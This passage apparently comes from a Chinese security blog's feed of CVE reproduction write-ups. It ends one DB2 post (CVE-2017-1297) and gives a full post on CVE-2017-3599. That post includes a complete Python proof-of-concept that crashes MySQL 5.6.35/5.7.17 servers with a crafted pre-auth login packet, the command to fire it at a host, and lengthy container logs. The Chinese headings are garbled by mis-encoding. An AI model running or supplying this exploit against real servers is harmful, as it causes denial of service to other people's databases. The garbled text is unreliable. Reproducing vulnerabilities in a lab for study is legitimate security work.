<h2 id="æ”»å‡»æˆåŠŸæ•ˆæœ"><a href="#æ”»å‡»æˆåŠŸæ•ˆæœ" class="headerlink" title="æ”»å‡»æˆåŠŸæ•ˆæœ"></a>æ”»å‡»æˆåŠŸæ•ˆæœ</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">â€¦â€¦ï¼ˆæ­¤å¤„çœç•¥nè¡Œï¼‰â€¦â€¦</span><br><span class="line"></span><br><span class="line">[+] å·²è¿æ¥æˆåŠŸç›®æ ‡æ•°æ®åº“</span><br><span class="line">[+] æ­£åœ¨æŸ¥è¯¢ç›®æ ‡æ•°æ®åº“æ•°æ®</span><br><span class="line"></span><br><span class="line">STU_NAME   STU_AGE   </span><br><span class="line">---------- ----------</span><br><span class="line">alice      20        </span><br><span class="line">bob        16        </span><br><span class="line">tom        19        </span><br><span class="line">john       32        </span><br><span class="line">amy        13        </span><br><span class="line">france     56        </span><br><span class="line">frank      41        </span><br><span class="line"></span><br><span class="line">7 record(s) selected.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] æ­£åœ¨å‘é€PoC</span><br><span class="line">[+] PoCå‘é€æˆåŠŸ</span><br><span class="line">[+] å†æ¬¡å°è¯•æŸ¥è¯¢æ•°æ®åº“</span><br><span class="line">SQL1024N  A database connection does not exist.  SQLSTATE=08003</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>æ¼æ´å¤ç°</category>
      </categories>
      <tags>
        <tag>CVE-2017-1297</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2017-3599æ¼æ´å¤ç°</title>
    <url>/2024/01/14/CVE-2017-3599%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<span id="more"></span>

<h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><p><a href="https://www.exploit-db.com/exploits/41954">MySQL &lt; 5.6.35 &#x2F; &lt; 5.7.17 - Integer Overflow - Multiple dos Exploit</a></p>
<h2 id="æ¼æ´è¯´æ˜"><a href="#æ¼æ´è¯´æ˜" class="headerlink" title="æ¼æ´è¯´æ˜"></a>æ¼æ´è¯´æ˜</h2><blockquote>
<p>Vulnerability in the MySQL Server component of Oracle MySQL (subcomponent: Server: Pluggable Auth). Supported versions that are affected are 5.6.35 and earlier and 5.7.17 and earlier. Easily â€œexploitableâ€ vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise MySQL Server. Successful attacks of this vulnerability can result in unauthorized ability to cause a hang or frequently repeatable crash (complete DOS) of MySQL Server. CVSS 3.0 Base Score 7.5 (Availability impacts). CVSS Vector: (CVSS:3.0&#x2F;AV:N&#x2F;AC:L&#x2F;PR:N&#x2F;UI:N&#x2F;S:U&#x2F;C:N&#x2F;I:N&#x2F;A:H). NOTE: the previous information is from the April 2017 CPU. Oracle has not commented on third-party claims that this issue is an integer overflow in sql&#x2F;auth&#x2F;sql_authentication.cc which allows remote attackers to cause a denial of service via a crafted authentication packet.</p>
</blockquote>
<h2 id="è¢«æµ‹ç¯å¢ƒ"><a href="#è¢«æµ‹ç¯å¢ƒ" class="headerlink" title="è¢«æµ‹ç¯å¢ƒ"></a>è¢«æµ‹ç¯å¢ƒ</h2><ul>
<li>dockeré•œåƒï¼š<code>mysql:5.6.35</code></li>
<li>å¯åŠ¨è¢«æµ‹ç¯å¢ƒå®¹å™¨ï¼š<code>docker run -d -p 3306:3306 -e MYSQL_ROOT_PASSWORD=123456 pmysql:5.6.35</code></li>
</ul>
<h2 id="POCè„šæœ¬"><a href="#POCè„šæœ¬" class="headerlink" title="POCè„šæœ¬"></a>POCè„šæœ¬</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># python2.7</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"># Source: https://raw.githubusercontent.com/SECFORCE/CVE-2017-3599/master/cve-2017-3599_poc.py</span></span><br><span class="line"><span class="string"># Exploit Title: Remote MySQL DOS (Integer Overflow)</span></span><br><span class="line"><span class="string"># Google Dork: N/A</span></span><br><span class="line"><span class="string"># Date: 13th April 2017</span></span><br><span class="line"><span class="string"># Exploit Author: Rodrigo Marcos</span></span><br><span class="line"><span class="string"># Vendor Homepage: https://www.mysql.com/</span></span><br><span class="line"><span class="string"># Software Link: https://www.mysql.com/downloads/</span></span><br><span class="line"><span class="string"># Version: 5.6.35 and below / 5.7.17 and below</span></span><br><span class="line"><span class="string"># Tested on: N/A</span></span><br><span class="line"><span class="string"># CVE : CVE-2017-3599</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket </span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">CVE-2017-3599 Proof of Concept exploit code.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">https://www.secforce.com/blog/2017/04/cve-2017-3599-pre-auth-mysql-remote-dos/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Rodrigo Marcos</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv)&lt;<span class="number">2</span>:</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;Usage: python &quot;</span> + sys.argv[<span class="number">0</span>] + <span class="string">&quot; host [port]&quot;</span></span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    HOST = sys.argv[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv)&gt;<span class="number">2</span>:</span><br><span class="line">        PORT = <span class="built_in">int</span>(sys.argv[<span class="number">2</span>]) <span class="comment"># Yes, no error checking... living on the wild side!</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        PORT = <span class="number">3306</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;[+] Creating packet...&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">3 bytes		Packet lenth</span></span><br><span class="line"><span class="string">1 bytes 	Packet number</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Login request:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Packet format (when the server is 4.1 or newer):</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Bytes       Content</span></span><br><span class="line"><span class="string">-----       ----</span></span><br><span class="line"><span class="string">4           client capabilities</span></span><br><span class="line"><span class="string">4           max packet size</span></span><br><span class="line"><span class="string">1           charset number</span></span><br><span class="line"><span class="string">23          reserved (always 0)</span></span><br><span class="line"><span class="string">n           user name, \0-terminated</span></span><br><span class="line"><span class="string">n           plugin auth data (e.g. scramble), length encoded</span></span><br><span class="line"><span class="string">n           database name, \0-terminated</span></span><br><span class="line"><span class="string">            (if CLIENT_CONNECT_WITH_DB is set in the capabilities)</span></span><br><span class="line"><span class="string">n           client auth plugin name - \0-terminated string,</span></span><br><span class="line"><span class="string">            (if CLIENT_PLUGIN_AUTH is set in the capabilities)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># packet_len = &#x27;\x64\x00\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">packet_num = <span class="string">&#x27;\x01&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Login request packet</span></span><br><span class="line">packet_cap = <span class="string">&#x27;\x85\xa2\xbf\x01&#x27;</span>		<span class="comment"># client capabilities (default)</span></span><br><span class="line">packet_max = <span class="string">&#x27;\x00\x00\x00\x01&#x27;</span>		<span class="comment"># max packet size (default)</span></span><br><span class="line">packet_cset = <span class="string">&#x27;\x21&#x27;</span>				<span class="comment"># charset (default)</span></span><br><span class="line">p_reserved = <span class="string">&#x27;\x00&#x27;</span> * <span class="number">23</span> 			<span class="comment"># 23 bytes reserved with nulls (default)</span></span><br><span class="line">packet_usr =  <span class="string">&#x27;test\x00&#x27;</span> 			<span class="comment"># username null terminated (default)</span></span><br><span class="line"></span><br><span class="line">packet_auth  = <span class="string">&#x27;\xff&#x27;</span>			<span class="comment"># both \xff and \xfe crash the server</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Conditions to crash:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">1 - packet_auth must start with \xff or \xfe</span></span><br><span class="line"><span class="string">2 - packet_auth must be shorter than 8 chars</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">The expected value is the password, which could be of two different formats</span></span><br><span class="line"><span class="string">(null terminated or length encoded) depending on the client functionality.</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">packet = packet_cap + packet_max + packet_cset + p_reserved + packet_usr + packet_auth </span><br><span class="line">packet_len = pack(<span class="string">&#x27;i&#x27;</span>,<span class="built_in">len</span>(packet))[:<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line">request = packet_len + packet_num + packet</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;[+] Connecting to host...&quot;</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.connect((HOST, PORT))</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;[+] Connected.&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;[+] Unable to connect to host &quot;</span> + HOST + <span class="string">&quot; on port &quot;</span> + <span class="built_in">str</span>(PORT) + <span class="string">&quot;.&quot;</span>	</span><br><span class="line">    s.close()</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;[+] Exiting.&quot;</span></span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;[+] Receiving greeting from remote host...&quot;</span></span><br><span class="line">data = s.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;[+] Done.&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;[+] Sending our payload...&quot;</span></span><br><span class="line">s.send(request)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;[+] Done.&quot;</span></span><br><span class="line"><span class="comment">#print &quot;Our data: %r&quot; % request</span></span><br><span class="line"></span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure>

<h2 id="æ”»å‡»æ‰§è¡Œ"><a href="#æ”»å‡»æ‰§è¡Œ" class="headerlink" title="æ”»å‡»æ‰§è¡Œ"></a>æ”»å‡»æ‰§è¡Œ</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">python poc.py IP 3306</span><br></pre></td></tr></table></figure>

<h2 id="æ”»å‡»æ•ˆæœ"><a href="#æ”»å‡»æ•ˆæœ" class="headerlink" title="æ”»å‡»æ•ˆæœ"></a>æ”»å‡»æ•ˆæœ</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">æ‹’ç»æœåŠ¡ï¼ŒæŸ¥çœ‹æ•°æ®åº“çš„å®¹å™¨æ—¥å¿—ï¼š</span><br><span class="line"></span><br><span class="line">root@yml-penetration:~/Workspace/cve-2017-3599<span class="comment"># docker logs 100</span></span><br><span class="line">Initializing database</span><br><span class="line">2023-12-19 12:19:33 0 [Note] Ignoring --secure-file-priv value as server is running with --bootstrap.</span><br><span class="line">2023-12-19 12:19:33 0 [Note] /usr/sbin/mysqld (mysqld 5.6.35) starting as process 36 ...</span><br><span class="line">2023-12-19 12:19:33 36 [Note] InnoDB: Using atomics to ref count buffer pool pages</span><br><span class="line">2023-12-19 12:19:33 36 [Note] InnoDB: The InnoDB memory heap is disabled</span><br><span class="line">2023-12-19 12:19:33 36 [Note] InnoDB: Mutexes and rw_locks use GCC atomic builtins</span><br><span class="line">2023-12-19 12:19:33 36 [Note] InnoDB: Memory barrier is not used</span><br><span class="line">2023-12-19 12:19:33 36 [Note] InnoDB: Compressed tables use zlib 1.2.8</span><br><span class="line">2023-12-19 12:19:33 36 [Note] InnoDB: Using Linux native AIO</span><br><span class="line">2023-12-19 12:19:33 36 [Note] InnoDB: Not using CPU crc32 instructions</span><br><span class="line">2023-12-19 12:19:33 36 [Note] InnoDB: Initializing buffer pool, size = 128.0M</span><br><span class="line">2023-12-19 12:19:33 36 [Note] InnoDB: Completed initialization of buffer pool</span><br><span class="line">2023-12-19 12:19:33 36 [Note] InnoDB: The first specified data file ./ibdata1 did not exist: a new database to be created!</span><br><span class="line">2023-12-19 12:19:33 36 [Note] InnoDB: Setting file ./ibdata1 size to 12 MB</span><br><span class="line">2023-12-19 12:19:33 36 [Note] InnoDB: Database physically writes the file full: <span class="built_in">wait</span>...</span><br><span class="line">2023-12-19 12:19:33 36 [Note] InnoDB: Setting <span class="built_in">log</span> file ./ib_logfile101 size to 48 MB</span><br><span class="line">2023-12-19 12:19:33 36 [Note] InnoDB: Setting <span class="built_in">log</span> file ./ib_logfile1 size to 48 MB</span><br><span class="line">2023-12-19 12:19:34 36 [Note] InnoDB: Renaming <span class="built_in">log</span> file ./ib_logfile101 to ./ib_logfile0</span><br><span class="line">2023-12-19 12:19:34 36 [Warning] InnoDB: New <span class="built_in">log</span> files created, LSN=45781</span><br><span class="line">2023-12-19 12:19:34 36 [Note] InnoDB: Doublewrite buffer not found: creating new</span><br><span class="line">2023-12-19 12:19:34 36 [Note] InnoDB: Doublewrite buffer created</span><br><span class="line">2023-12-19 12:19:34 36 [Note] InnoDB: 128 rollback segment(s) are active.</span><br><span class="line">2023-12-19 12:19:34 36 [Warning] InnoDB: Creating foreign key constraint system tables.</span><br><span class="line">2023-12-19 12:19:34 36 [Note] InnoDB: Foreign key constraint system tables created</span><br><span class="line">2023-12-19 12:19:34 36 [Note] InnoDB: Creating tablespace and datafile system tables.</span><br><span class="line">2023-12-19 12:19:34 36 [Note] InnoDB: Tablespace and datafile system tables created.</span><br><span class="line">2023-12-19 12:19:34 36 [Note] InnoDB: Waiting <span class="keyword">for</span> purge to start</span><br><span class="line">2023-12-19 12:19:34 36 [Note] InnoDB: 5.6.35 started; <span class="built_in">log</span> sequence number 0</span><br><span class="line">2023-12-19 12:19:36 36 [Note] Binlog end</span><br><span class="line">2023-12-19 12:19:36 36 [Note] InnoDB: FTS optimize thread exiting.</span><br><span class="line">2023-12-19 12:19:36 36 [Note] InnoDB: Starting shutdown...</span><br><span class="line">2023-12-19 12:19:38 36 [Note] InnoDB: Shutdown completed; <span class="built_in">log</span> sequence number 1625977</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">2023-12-19 12:19:38 0 [Note] Ignoring --secure-file-priv value as server is running with --bootstrap.</span><br><span class="line">2023-12-19 12:19:38 0 [Note] /usr/sbin/mysqld (mysqld 5.6.35) starting as process 59 ...</span><br><span class="line">2023-12-19 12:19:38 59 [Note] InnoDB: Using atomics to ref count buffer pool pages</span><br><span class="line">2023-12-19 12:19:38 59 [Note] InnoDB: The InnoDB memory heap is disabled</span><br><span class="line">2023-12-19 12:19:38 59 [Note] InnoDB: Mutexes and rw_locks use GCC atomic builtins</span><br><span class="line">2023-12-19 12:19:38 59 [Note] InnoDB: Memory barrier is not used</span><br><span class="line">2023-12-19 12:19:38 59 [Note] InnoDB: Compressed tables use zlib 1.2.8</span><br><span class="line">2023-12-19 12:19:38 59 [Note] InnoDB: Using Linux native AIO</span><br><span class="line">2023-12-19 12:19:38 59 [Note] InnoDB: Not using CPU crc32 instructions</span><br><span class="line">2023-12-19 12:19:38 59 [Note] InnoDB: Initializing buffer pool, size = 128.0M</span><br><span class="line">2023-12-19 12:19:38 59 [Note] InnoDB: Completed initialization of buffer pool</span><br><span class="line">2023-12-19 12:19:38 59 [Note] InnoDB: Highest supported file format is Barracuda.</span><br><span class="line">2023-12-19 12:19:38 59 [Note] InnoDB: 128 rollback segment(s) are active.</span><br><span class="line">2023-12-19 12:19:38 59 [Note] InnoDB: Waiting <span class="keyword">for</span> purge to start</span><br><span class="line">2023-12-19 12:19:38 59 [Note] InnoDB: 5.6.35 started; <span class="built_in">log</span> sequence number 1625977</span><br><span class="line">2023-12-19 12:19:38 59 [Note] Binlog end</span><br><span class="line">2023-12-19 12:19:38 59 [Note] InnoDB: FTS optimize thread exiting.</span><br><span class="line">2023-12-19 12:19:38 59 [Note] InnoDB: Starting shutdown...</span><br><span class="line">2023-12-19 12:19:40 59 [Note] InnoDB: Shutdown completed; <span class="built_in">log</span> sequence number 1625987</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PLEASE REMEMBER TO SET A PASSWORD FOR THE MySQL root USER !</span><br><span class="line">To <span class="keyword">do</span> so, start the server, <span class="keyword">then</span> issue the following commands:</span><br><span class="line"></span><br><span class="line">/usr/bin/mysqladmin -u root password <span class="string">&#x27;new-password&#x27;</span></span><br><span class="line">/usr/bin/mysqladmin -u root -h 100bfe039d09 password <span class="string">&#x27;new-password&#x27;</span></span><br><span class="line"></span><br><span class="line">Alternatively you can run:</span><br><span class="line"></span><br><span class="line">/usr/bin/mysql_secure_installation</span><br><span class="line"></span><br><span class="line"><span class="built_in">which</span> will also give you the option of removing the <span class="built_in">test</span></span><br><span class="line">databases and anonymous user created by default.  This is</span><br><span class="line">strongly recommended <span class="keyword">for</span> production servers.</span><br><span class="line"></span><br><span class="line">See the manual <span class="keyword">for</span> more instructions.</span><br><span class="line"></span><br><span class="line">Please report any problems at http://bugs.mysql.com/</span><br><span class="line"></span><br><span class="line">The latest information about MySQL is available on the web at</span><br><span class="line"></span><br><span class="line">http://www.mysql.com</span><br><span class="line"></span><br><span class="line">Support MySQL by buying support/licenses at http://shop.mysql.com</span><br><span class="line"></span><br><span class="line">Note: new default config file not created.</span><br><span class="line">Please make sure your config file is current</span><br><span class="line"></span><br><span class="line">WARNING: Default config file /etc/mysql/my.cnf exists on the system</span><br><span class="line">This file will be <span class="built_in">read</span> by default by the MySQL server</span><br><span class="line">If you <span class="keyword">do</span> not want to use this, either remove it, or use the</span><br><span class="line">--defaults-file argument to mysqld_safe when starting the server</span><br><span class="line"></span><br><span class="line">Database initialized</span><br><span class="line">MySQL init process <span class="keyword">in</span> progress...</span><br><span class="line">2023-12-19 12:19:40 0 [Note] mysqld (mysqld 5.6.35) starting as process 87 ...</span><br><span class="line">2023-12-19 12:19:40 87 [Note] Plugin <span class="string">&#x27;FEDERATED&#x27;</span> is disabled.</span><br><span class="line">2023-12-19 12:19:40 87 [Note] InnoDB: Using atomics to ref count buffer pool pages</span><br><span class="line">2023-12-19 12:19:40 87 [Note] InnoDB: The InnoDB memory heap is disabled</span><br><span class="line">2023-12-19 12:19:40 87 [Note] InnoDB: Mutexes and rw_locks use GCC atomic builtins</span><br><span class="line">2023-12-19 12:19:40 87 [Note] InnoDB: Memory barrier is not used</span><br><span class="line">2023-12-19 12:19:40 87 [Note] InnoDB: Compressed tables use zlib 1.2.8</span><br><span class="line">2023-12-19 12:19:40 87 [Note] InnoDB: Using Linux native AIO</span><br><span class="line">2023-12-19 12:19:40 87 [Note] InnoDB: Not using CPU crc32 instructions</span><br><span class="line">2023-12-19 12:19:40 87 [Note] InnoDB: Initializing buffer pool, size = 128.0M</span><br><span class="line">2023-12-19 12:19:40 87 [Note] InnoDB: Completed initialization of buffer pool</span><br><span class="line">2023-12-19 12:19:40 87 [Note] InnoDB: Highest supported file format is Barracuda.</span><br><span class="line">2023-12-19 12:19:40 87 [Note] InnoDB: 128 rollback segment(s) are active.</span><br><span class="line">2023-12-19 12:19:40 87 [Note] InnoDB: Waiting <span class="keyword">for</span> purge to start</span><br><span class="line">2023-12-19 12:19:40 87 [Note] InnoDB: 5.6.35 started; <span class="built_in">log</span> sequence number 1625987</span><br><span class="line">2023-12-19 12:19:40 87 [Warning] No existing UUID has been found, so we assume that this is the first time that this server has been started. Generating a new UUID: e27a6a12-9e68-11ee-867c-0242ac110002.</span><br><span class="line">2023-12-19 12:19:40 87 [Warning] <span class="string">&#x27;user&#x27;</span> entry <span class="string">&#x27;root@100bfe039d09&#x27;</span> ignored <span class="keyword">in</span> --skip-name-resolve mode.</span><br><span class="line">2023-12-19 12:19:40 87 [Warning] <span class="string">&#x27;user&#x27;</span> entry <span class="string">&#x27;@100bfe039d09&#x27;</span> ignored <span class="keyword">in</span> --skip-name-resolve mode.</span><br><span class="line">2023-12-19 12:19:40 87 [Warning] <span class="string">&#x27;proxies_priv&#x27;</span> entry <span class="string">&#x27;@ root@100bfe039d09&#x27;</span> ignored <span class="keyword">in</span> --skip-name-resolve mode.</span><br><span class="line">2023-12-19 12:19:40 87 [Note] Event Scheduler: Loaded 0 events</span><br><span class="line">2023-12-19 12:19:40 87 [Note] mysqld: ready <span class="keyword">for</span> connections.</span><br><span class="line">Version: <span class="string">&#x27;5.6.35&#x27;</span>  socket: <span class="string">&#x27;/var/run/mysqld/mysqld.sock&#x27;</span>  port: 0  MySQL Community Server (GPL)</span><br><span class="line">Warning: Unable to load <span class="string">&#x27;/usr/share/zoneinfo/iso3166.tab&#x27;</span> as time zone. Skipping it.</span><br><span class="line">Warning: Unable to load <span class="string">&#x27;/usr/share/zoneinfo/leap-seconds.list&#x27;</span> as time zone. Skipping it.</span><br><span class="line">Warning: Unable to load <span class="string">&#x27;/usr/share/zoneinfo/zone.tab&#x27;</span> as time zone. Skipping it.</span><br><span class="line">2023-12-19 12:19:42 87 [Warning] <span class="string">&#x27;proxies_priv&#x27;</span> entry <span class="string">&#x27;@ root@100bfe039d09&#x27;</span> ignored <span class="keyword">in</span> --skip-name-resolve mode.</span><br><span class="line"></span><br><span class="line">2023-12-19 12:19:42 87 [Note] mysqld: Normal shutdown</span><br><span class="line"></span><br><span class="line">2023-12-19 12:19:42 87 [Note] Giving 0 client threads a chance to die gracefully</span><br><span class="line">2023-12-19 12:19:42 87 [Note] Event Scheduler: Purging the queue. 0 events</span><br><span class="line">2023-12-19 12:19:42 87 [Note] Shutting down slave threads</span><br><span class="line">2023-12-19 12:19:42 87 [Note] Forcefully disconnecting 0 remaining clients</span><br><span class="line">2023-12-19 12:19:42 87 [Note] Binlog end</span><br><span class="line">2023-12-19 12:19:42 87 [Note] Shutting down plugin <span class="string">&#x27;partition&#x27;</span></span><br><span class="line">2023-12-19 12:19:42 87 [Note] Shutting down plugin <span class="string">&#x27;INNODB_SYS_DATAFILES&#x27;</span></span><br><span class="line">2023-12-19 12:19:42 87 [Note] Shutting down plugin <span class="string">&#x27;INNODB_SYS_TABLESPACES&#x27;</span></span><br><span class="line">2023-12-19 12:19:42 87 [Note] Shutting down plugin <span class="string">&#x27;INNODB_SYS_FOREIGN_COLS&#x27;</span></span><br><span class="line">2023-12-19 12:19:42 87 [Note] Shutting down plugin <span class="string">&#x27;INNODB_SYS_FOREIGN&#x27;</span></span><br><span class="line">2023-12-19 12:19:42 87 [Note] Shutting down plugin <span class="string">&#x27;INNODB_SYS_FIELDS&#x27;</span></span><br><span class="line">2023-12-19 12:19:42 87 [Note] Shutting down plugin <span class="string">&#x27;INNODB_SYS_COLUMNS&#x27;</span></span><br><span class="line">2023-12-19 12:19:42 87 [Note] Shutting down plugin <span class="string">&#x27;INNODB_SYS_INDEXES&#x27;</span></span><br><span class="line">2023-12-19 12:19:42 87 [Note] Shutting down plugin <span class="string">&#x27;INNODB_SYS_TABLESTATS&#x27;</span></span><br><span class="line">2023-12-19 12:19:42 87 [Note] Shutting down plugin <span class="string">&#x27;INNODB_SYS_TABLES&#x27;</span></span><br><span class="line">2023-12-19 12:19:42 87 [Note] Shutting down plugin <span class="string">&#x27;INNODB_FT_INDEX_TABLE&#x27;</span></span><br><span class="line">2023-12-19 12:19:42 87 [Note] Shutting down plugin <span class="string">&#x27;INNODB_FT_INDEX_CACHE&#x27;</span></span><br><span class="line">2023-12-19 12:19:42 87 [Note] Shutting down plugin <span class="string">&#x27;INNODB_FT_CONFIG&#x27;</span></span><br><span class="line">2023-12-19 12:19:42 87 [Note] Shutting down plugin <span class="string">&#x27;INNODB_FT_BEING_DELETED&#x27;</span></span><br><span class="line">2023-12-19 12:19:42 87 [Note] Shutting down plugin <span class="string">&#x27;INNODB_FT_DELETED&#x27;</span></span><br><span class="line">2023-12-19 12:19:42 87 [Note] Shutting down plugin <span class="string">&#x27;INNODB_FT_DEFAULT_STOPWORD&#x27;</span></span><br><span class="line">2023-12-19 12:19:42 87 [Note] Shutting down plugin <span class="string">&#x27;INNODB_METRICS&#x27;</span></span><br><span class="line">2023-12-19 12:19:42 87 [Note] Shutting down plugin <span class="string">&#x27;INNODB_BUFFER_POOL_STATS&#x27;</span></span><br><span class="line">2023-12-19 12:19:42 87 [Note] Shutting down plugin <span class="string">&#x27;INNODB_BUFFER_PAGE_LRU&#x27;</span></span><br><span class="line">2023-12-19 12:19:42 87 [Note] Shutting down plugin <span class="string">&#x27;INNODB_BUFFER_PAGE&#x27;</span></span><br><span class="line">2023-12-19 12:19:42 87 [Note] Shutting down plugin <span class="string">&#x27;INNODB_CMP_PER_INDEX_RESET&#x27;</span></span><br><span class="line">2023-12-19 12:19:42 87 [Note] Shutting down plugin <span class="string">&#x27;INNODB_CMP_PER_INDEX&#x27;</span></span><br><span class="line">2023-12-19 12:19:42 87 [Note] Shutting down plugin <span class="string">&#x27;INNODB_CMPMEM_RESET&#x27;</span></span><br><span class="line">2023-12-19 12:19:42 87 [Note] Shutting down plugin <span class="string">&#x27;INNODB_CMPMEM&#x27;</span></span><br><span class="line">2023-12-19 12:19:42 87 [Note] Shutting down plugin <span class="string">&#x27;INNODB_CMP_RESET&#x27;</span></span><br><span class="line">2023-12-19 12:19:42 87 [Note] Shutting down plugin <span class="string">&#x27;INNODB_CMP&#x27;</span></span><br><span class="line">2023-12-19 12:19:42 87 [Note] Shutting down plugin <span class="string">&#x27;INNODB_LOCK_WAITS&#x27;</span></span><br><span class="line">2023-12-19 12:19:42 87 [Note] Shutting down plugin <span class="string">&#x27;INNODB_LOCKS&#x27;</span></span><br><span class="line">2023-12-19 12:19:42 87 [Note] Shutting down plugin <span class="string">&#x27;INNODB_TRX&#x27;</span></span><br><span class="line">2023-12-19 12:19:42 87 [Note] Shutting down plugin <span class="string">&#x27;InnoDB&#x27;</span></span><br><span class="line">2023-12-19 12:19:42 87 [Note] InnoDB: FTS optimize thread exiting.</span><br><span class="line">2023-12-19 12:19:42 87 [Note] InnoDB: Starting shutdown...</span><br><span class="line">2023-12-19 12:19:43 87 [Note] InnoDB: Shutdown completed; <span class="built_in">log</span> sequence number 1625997</span><br><span class="line">2023-12-19 12:19:43 87 [Note] Shutting down plugin <span class="string">&#x27;BLACKHOLE&#x27;</span></span><br><span class="line">2023-12-19 12:19:43 87 [Note] Shutting down plugin <span class="string">&#x27;ARCHIVE&#x27;</span></span><br><span class="line">2023-12-19 12:19:43 87 [Note] Shutting down plugin <span class="string">&#x27;PERFORMANCE_SCHEMA&#x27;</span></span><br><span class="line">2023-12-19 12:19:43 87 [Note] Shutting down plugin <span class="string">&#x27;MRG_MYISAM&#x27;</span></span><br><span class="line">2023-12-19 12:19:43 87 [Note] Shutting down plugin <span class="string">&#x27;MyISAM&#x27;</span></span><br><span class="line">2023-12-19 12:19:43 87 [Note] Shutting down plugin <span class="string">&#x27;CSV&#x27;</span></span><br><span class="line">2023-12-19 12:19:43 87 [Note] Shutting down plugin <span class="string">&#x27;MEMORY&#x27;</span></span><br><span class="line">2023-12-19 12:19:43 87 [Note] Shutting down plugin <span class="string">&#x27;sha256_password&#x27;</span></span><br><span class="line">2023-12-19 12:19:43 87 [Note] Shutting down plugin <span class="string">&#x27;mysql_old_password&#x27;</span></span><br><span class="line">2023-12-19 12:19:43 87 [Note] Shutting down plugin <span class="string">&#x27;mysql_native_password&#x27;</span></span><br><span class="line">2023-12-19 12:19:43 87 [Note] Shutting down plugin <span class="string">&#x27;binlog&#x27;</span></span><br><span class="line">2023-12-19 12:19:43 87 [Note] mysqld: Shutdown complete</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">MySQL init process <span class="keyword">done</span>. Ready <span class="keyword">for</span> start up.</span><br><span class="line"></span><br><span class="line">2023-12-19 12:19:44 0 [Note] mysqld (mysqld 5.6.35) starting as process 1 ...</span><br><span class="line">2023-12-19 12:19:44 1 [Note] Plugin <span class="string">&#x27;FEDERATED&#x27;</span> is disabled.</span><br><span class="line">2023-12-19 12:19:44 1 [Note] InnoDB: Using atomics to ref count buffer pool pages</span><br><span class="line">2023-12-19 12:19:44 1 [Note] InnoDB: The InnoDB memory heap is disabled</span><br><span class="line">2023-12-19 12:19:44 1 [Note] InnoDB: Mutexes and rw_locks use GCC atomic builtins</span><br><span class="line">2023-12-19 12:19:44 1 [Note] InnoDB: Memory barrier is not used</span><br><span class="line">2023-12-19 12:19:44 1 [Note] InnoDB: Compressed tables use zlib 1.2.8</span><br><span class="line">2023-12-19 12:19:44 1 [Note] InnoDB: Using Linux native AIO</span><br><span class="line">2023-12-19 12:19:44 1 [Note] InnoDB: Not 